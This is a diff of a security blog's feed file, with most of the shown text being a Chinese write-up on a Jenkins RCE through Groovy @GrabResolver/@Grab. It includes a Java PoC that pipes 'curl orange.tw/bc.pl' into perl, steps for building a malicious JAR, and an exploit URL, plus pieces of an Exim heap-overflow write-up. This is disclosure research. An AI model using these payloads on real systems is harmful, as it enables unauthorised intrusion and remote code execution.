+&lt;p&gt;原來 Grape(&lt;code class=&quot;highlighter-rouge&quot;&gt;@Grab&lt;/code&gt;) 是一個 Groovy 內建的動態 JAR 相依性管理程式! 可讓開發者動態的引入不在 classPath 上的函式庫! Grape 的語法如下:&lt;/p&gt;
+
+&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;org.springframework&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;spring-orm&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;3.2.5.RELEASE&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.springframework.jdbc.core.JdbcTemplate&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;配合 &lt;code class=&quot;highlighter-rouge&quot;&gt;@grab&lt;/code&gt; 的註解，可讓 Groovy 在編譯時期自動引入不存在於 classPath 中的 JAR 檔! 但如果你的目的只是要在一個有執行 Pipeline 權限的帳號上繞過原有 Pipeline 的 Sandbox 的話，這其實就足夠了! 例如你可以參考 &lt;a href=&quot;https://github.com/adamyordan&quot;&gt;@adamyordan&lt;/a&gt; 所提供的 &lt;a href=&quot;https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc&quot;&gt;PoC&lt;/a&gt;，在已知使用者帳號與密碼及權限足夠的情況下，達到遠端代碼執行的效果!&lt;/p&gt;
+
+&lt;p&gt;但在沒有帳號密碼及 &lt;code class=&quot;highlighter-rouge&quot;&gt;execute()&lt;/code&gt; 的方法下，這只是一個簡單的語法樹解析器，你甚至無法控制遠端伺服器上的檔案，所以該怎麼辦呢? 我們繼續研究下去，並發現了一個很有趣的註解叫做 &lt;code class=&quot;highlighter-rouge&quot;&gt;@GrabResolver&lt;/code&gt;，用法如下:&lt;/p&gt;
+
+&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@GrabResolver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;restlet&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;http://maven.restlet.org/&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nd&quot;&gt;@Grab&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;org.restlet&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;org.restlet&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;1.1.6&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;org.restlet&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;看到這個，聰明的你應該會很想把 &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; 改成惡意網址對吧! 我們來試試會怎麼樣吧!&lt;/p&gt;
+
+&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;&#39;&#39;
+@GrabResolver(name=&#39;restlet&#39;, root=&#39;http://orange.tw/&#39;)
+@Grab(group=&#39;org.restlet&#39;, module=&#39;org.restlet&#39;, version=&#39;1.1.6&#39;)
+import org.restlet
+&#39;&#39;&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-log&quot;&gt;11.22.33.44 - - [18/Dec/2018:18:56:54 +0800] &quot;HEAD /org/restlet/org.restlet/1.1.6/org.restlet-1.1.6-javadoc.jar HTTP/1.1&quot; 404 185 &quot;-&quot; &quot;Apache Ivy/2.4.0&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;喔幹，真的會來存取欸! 到這裡我們已經確信了透過 Grape 可以讓 Jenkins 引入惡意的函式庫! 但下一個問題是，要如何執行代碼呢?&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;如何執行任意代碼&quot;&gt;如何執行任意代碼?&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;在漏洞的利用中總是在研究如何從簡單的任意讀、任意寫到取得系統執行的權限! 從前面的例子中，我們已經可以透過 Grape 去寫入惡意的 JAR 檔到遠端伺服器，但要怎麼執行這個 JAR 檔呢? 這又是另一個問題!&lt;/p&gt;
+
+&lt;p&gt;跟進 Groovy 語言核心查看對於 &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/Grape.java&quot;&gt;Grape 的實作&lt;/a&gt;，我們知道網路層的抓取是透過 &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/master/src/main/groovy/grape/GrapeIvy.groovy&quot;&gt;groovy.grape.GrapeIvy&lt;/a&gt; 這個類別來完成! 所以開始尋找實作中是否有任何可以執行代碼的機會! 其中，我們看到了一個有趣的方法 - &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L312&quot;&gt;processOtherServices(…)&lt;/a&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processOtherServices&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ZipFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.runtime.SerializedCategoryMethods&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;processSerializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serializedCategoryMethods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ZipEntry&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getEntry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;META-INF/services/org.codehaus.groovy.plugins.Runners&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pluginRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZipException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ignore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// ignore files we can&#39;t process, e.g. non-jar/zip artifacts&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// TODO log a warning&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;由於 JAR 檔案其實就是一個 ZIP 壓縮格式的子集，Grape 會檢查檔案中是否存在一些指定的入口點，其中一個 &lt;code class=&quot;highlighter-rouge&quot;&gt;Runner&lt;/code&gt; 的入口點檢查引起了我們的興趣，持續跟進 &lt;a href=&quot;https://github.com/groovy/groovy-core/blob/GROOVY_2_4_3/src/main/groovy/grape/GrapeIvy.groovy#L335&quot;&gt;processRunners(…)&lt;/a&gt; 的實作我們發現:&lt;/p&gt;
+
+&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;processRunners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InputStream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClassLoader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;readLines&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;GroovySystem&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;RUNNER_REGISTRY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;loader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;loadClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;it&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;trim&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;這裡的 &lt;code class=&quot;highlighter-rouge&quot;&gt;newInstance()&lt;/code&gt; 不就代表著可以呼叫到任意類別的 &lt;code class=&quot;highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; 嗎? 沒錯! 所以只需產生一個惡意的 JAR 檔，把要執行的類別全名放至 &lt;code class=&quot;highlighter-rouge&quot;&gt;META-INF/services/org.codehaus.groovy.plugins.Runners&lt;/code&gt; 中即可呼叫指定類別的&lt;code class=&quot;highlighter-rouge&quot;&gt;Constructor&lt;/code&gt; 去執行任意代碼! 完整的漏洞利用過程如下:&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Poc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Poc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;curl orange.tw/bc.pl | perl -&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;};&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmds&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;javac Orange.java
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; META-INF/services/
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Orange &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; META-INF/services/org.codehaus.groovy.plugins.Runners
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+./Orange.java
+./Orange.class
+./META-INF
+./META-INF/services
+./META-INF/services/org.codehaus.groovy.plugins.Runners
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;jar cvf poc-1.jar tw/
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;poc-1.jar ~/www/tw/orange/poc/1/
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; http://[your_host]/tw/orange/poc/1/poc-1.jar
+HTTP/1.1 200 OK
+Date: Sat, 02 Feb 2019 11:10:55 GMT
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;PoC:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://jenkins.local/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
+?value=
+@GrabConfig(disableChecksums=true)%0a
+@GrabResolver(name=&#39;orange.tw&#39;, root=&#39;http://[your_host]/&#39;)%0a
+@Grab(group=&#39;tw.orange&#39;, module=&#39;poc&#39;, version=&#39;1&#39;)%0a
+import Orange;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;影片:&lt;/p&gt;
+
+&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;https://www.youtube.com/embed/abuH-j-6-s0&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;後記&quot;&gt;後記&lt;/h2&gt;
+&lt;hr /&gt;
+
+&lt;p&gt;到此，我們已經可以完整的控制遠端伺服器! 透過 Meta-Programming 在語法樹解析時期去引入惡意的 JAR 檔，再透過 Java 的 Static Initializer 特性去執行任意指令! 雖然 Jenkins 有內建的 Groovy Sandbox(&lt;a href=&quot;https://wiki.jenkins.io/display/JENKINS/Script+Security+Plugin&quot;&gt;Script Security Plugin&lt;/a&gt;)，但這個漏洞是在編譯階段而非執行階段，導致 Sandbox 毫無用武之處!&lt;/p&gt;
+
+&lt;p&gt;由於這是對於 Groovy 底層的一種攻擊方式，因此只要是所有可以碰觸到 Groovy 解析的地方皆有可能有漏洞產生! 而這也是這個漏洞好玩的地方，打破了一般開發者認為沒有執行就不會有問題的思維，對攻擊者來說也用了一個沒有電腦科學的理論知識背景不會知道的方法攻擊! 不然你根本不會想到 Meta-Programming! 除了我回報的 &lt;code class=&quot;highlighter-rouge&quot;&gt;doCheckScriptCompile(...)&lt;/code&gt; 與 &lt;code class=&quot;highlighter-rouge&quot;&gt;toJson(...)&lt;/code&gt; 兩個進入點外，在漏洞被修復後，&lt;a href=&quot;https://twitter.com/0ang3el&quot;&gt;Mikhail Egorov&lt;/a&gt; 也很快的找到了另外一個&lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-28/#SECURITY-1292&quot;&gt;進入點&lt;/a&gt;去觸發這個漏洞!&lt;/p&gt;
+
+&lt;p&gt;除此之外，這個漏洞更可以與我前一篇 &lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1&lt;/a&gt; 所發現的漏洞串起來，去繞過 Overall/Read 的限制成為一個名符其實不用認證的遠端代碼執行漏洞!(如果你有好好的讀完這兩篇文章，應該對你不是難事XD) 至於有沒有更多的玩法? 就交給大家自由發揮串出自己的攻擊鏈囉!&lt;/p&gt;
+
+&lt;p&gt;感謝大家的閱讀，Hacking Jenkins 系列文就在這裡差不多先告一個段落囉! 未來將會再發表更多有趣的技術研究敬請期待!&lt;/p&gt;
+
+</content>
+ </entry>
  
  <entry>
    <title>Hacking Jenkins Part 1 - Play with Dynamic Routing (EN)</title>
@@ -549,8 +1179,8 @@ Due to the lack of permission check on search functionality. By modifying the &l
 &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;store_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ustrlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
 &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;// perform decoding
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// perform decoding&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;As shown above, exim allocates a buffer of &lt;code class=&quot;highlighter-rouge&quot;&gt;3*(len/4)+1&lt;/code&gt; bytes to store decoded base64 data. However, when the input is not a valid base64 string and the length is &lt;code class=&quot;highlighter-rouge&quot;&gt;4n+3&lt;/code&gt;, exim allocates &lt;code class=&quot;highlighter-rouge&quot;&gt;3n+1&lt;/code&gt; but consumes &lt;code class=&quot;highlighter-rouge&quot;&gt;3n+2&lt;/code&gt; bytes while decoding. This causes one byte heap overflow (aka off-by-one).&lt;br /&gt;
@@ -1130,9 +1760,9 @@ This store makes &lt;code class=&quot;highlighter-rouge&quot;&gt;if (!store_exte
 
 &lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
 &lt;p&gt;The following is the Proof-of-Concept(PoC) python script of this vulnerability. This PoC controls the control flow of SMTP server and sets instruction pointer to &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;. For fuzzing issue, we did change the runtime configuration of exim. As a result, this PoC works only when &lt;strong&gt;dkim&lt;/strong&gt; is enabled. We use it as an example because the situation is less complicated. The version with default configuration is also exploitable, and we will discuss it at the end of this section.&lt;/p&gt;
